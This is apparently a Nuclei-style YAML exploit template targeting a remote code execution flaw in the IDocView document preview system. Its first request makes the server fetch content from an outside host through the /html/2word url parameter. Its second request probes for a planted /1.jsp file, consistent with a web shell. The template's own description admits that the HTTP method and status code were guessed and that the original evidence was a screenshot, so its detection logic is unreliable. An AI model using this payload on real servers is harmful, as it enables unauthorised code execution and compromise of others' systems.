id: poc-d5203c7ae074ff302e70
info:
  name: IDocView在线文档预览系统2word存在远程代码执行漏洞
  author: hacktwo
  severity: critical
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2025
http:
- raw:
  - 'GET /html/2word?url=http://xx.xx.xx.xx/index.html HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /1.jsp HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
